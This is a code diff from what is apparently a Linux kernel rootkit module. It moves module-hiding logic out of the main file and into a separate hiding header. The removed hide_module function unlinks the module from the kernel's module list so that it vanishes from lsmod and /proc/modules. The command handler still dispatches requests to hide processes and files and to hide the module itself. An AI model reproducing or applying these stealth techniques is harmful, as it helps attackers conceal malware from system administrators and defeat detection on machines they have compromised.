@@ -13,42 +13,8 @@
 
 #include "config.h"
 #include "proc.h"
-#include "hooks.h"
+#include "hiding.h"
 
-int hidden = 0;
-static struct list_head* prev;
-unsigned int num_symtab_old;
-
-int hide_module(void){
-	if (hidden)
-		return -1;
-	// Hide from /proc/modules (therefore from lsmod)
-	// We just delete the module from the list
-	prev = THIS_MODULE->list.prev;
-	list_del(&THIS_MODULE->list);
-	// Hide from /proc/kallsyms NOTE: it seems that hiding from /proc/modules also hides from kallsym??
-	// We set num_symtab to 0 so that this if in module_get_kallsyms never succeeds:
-	// https://elixir.bootlin.com/linux/v5.4.6/source/kernel/module.c#L4198
-	//num_symtab_old = THIS_MODULE->kallsyms->num_symtab; // TESTING
-	//printk(KERN_INFO "ROOTKIT: %d\n", num_symtab_old);
-	//THIS_MODULE->kallsyms->num_symtab = 0; // TESTING
-
-	//kobject_del(&THIS_MODULE->mkobj.kobj); //TESTING
-	hidden = 1;
-	return 0;
-}
-
-int unhide_module(void){
-	if (!hidden)
-		return -1;
-	list_add(&THIS_MODULE->list, prev); //adds the module after the module which was prev to it
-	//maybe we all die if this prev is not in the list anymore
-
-	//THIS_MODULE->kallsyms->num_symtab = num_symtab_old; // TESTING
-
-	hidden = 0;
-	return 0;
-}
 
 void handle_request(const char __user* buff, size_t len){
 	int id, pid;
@@ -76,22 +42,9 @@ void handle_request(const char __user* buff, size_t len){
 				printk(KERN_INFO "ROOTKIT: ERROR unhiding pid %d in proc\n", pid);
 			break;
 		case 5: // PRINT HIDDEN
-			printk(KERN_INFO "ROOTKIT: Hidden files: ");
-			struct list_files_node* node_file;
-			struct list_pids_node* node_pid;
-			list_for_each_entry(node_file, &list_files, list){
-				printk(KERN_CONT "%s, ", node_file->name);
-			}
-			printk(KERN_CONT "\n");
-			printk(KERN_INFO "ROOTKIT: Hidden pids: ");
-			list_for_each_entry(node_pid, &list_pids, list){
-				printk(KERN_CONT "%d, ", node_pid->pid);
-			}
-			printk(KERN_CONT "\n");
+			print_hidden();
 			break;
 		case 6: // HIDE MODULE
-			//if (delete_module("rootkit", O_NONBLOCK) == -1)
-			//	printk(KERN_INFO "ROOTKIT: ERROR trying to delete module\n");
 			if (hide_module() == -1)
 				printk(KERN_INFO "ROOTKIT: ERROR hiding module\n");
 			break;
